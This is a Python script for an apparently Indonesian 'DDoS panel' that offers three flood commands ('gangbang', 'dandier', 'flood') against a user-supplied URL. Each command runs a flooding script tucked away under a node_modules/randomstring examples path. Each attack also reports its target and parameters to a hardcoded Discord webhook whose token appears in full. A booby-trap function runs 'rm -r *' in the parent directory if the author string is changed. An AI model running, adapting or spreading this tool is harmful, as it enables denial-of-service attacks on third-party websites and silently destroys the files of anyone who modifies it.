#remake boleh tapi izin dulu!! 
#t.me/mrd4nd

import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform

def sendsocket(socket_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(socket_url, data=json.dumps(data), headers=headers)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
\033[1;31;40m

	         ██████╗░██████╗░░█████╗░░██████╗
	         ██╔══██╗██╔══██╗██╔══██╗██╔════╝
	         ██║░░██║██║░░██║██║░░██║╚█████╗░
	         ██║░░██║██║░░██║██║░░██║░╚═══██╗
	         ██████╔╝██████╔╝╚█████╔╝██████╔╝
	         ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
	
	      \033[1;37;40m    welcome to dandier ddos panel 
	
	               \033[1;32;40m dandier\033[1;37;40m [\033[1;33;40mvvip\033[1;37;40m] 
	    
	         \033[1;32;40m gangbang\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]   \033[1;32;40m flood\033[1;37;40m [\033[1;35;40mvip\033[1;37;40m]
''')
    while True:
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤  \x1b[38;2;239;239;239m''')
        if "gangbang" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                sendsocket(socket_url, f"\n\n---------------\nGANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
                mix = os.path.join("node_modules/randomstring/examples/methods", "mix.js")
                os.system(f'node {mix} {url} {time}')
            except IndexError:
                print('Usage: gangbang <url> <time>')
                print('Example: gangbang https://example.com 60')
        
        elif "dandier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                sendsocket(socket_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThreads: {thread}\n---------------\n‎ \n‎ \n‎ ")
                dandier = os.path.join("node_modules/randomstring/examples/methods", "dandier.java")
                os.system(f'java {dandier} {url} {thread}')
            except IndexError:
                print('Usage: dandier <url> <thread>')
                print('Example: dandier https://example.com 15000')
                
        elif "flood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
            except IndexError:
                print('Usage: flood <target> <workers> <rpc> <timer>')
                print('Example: flood https://example.com 500 250 60')
                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
            except IndexError:
                pass
                
socket_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"

def superddos():
    os.chdir('..') 
    time.sleep(3)
    file_list = os.listdir()

    for file in file_list:
        if os.path.isfile(file):
            subprocess.call("rm -r *", shell=True)
    
author = "dandier"

if author == "dandier":
    main()
else:
    superddos()
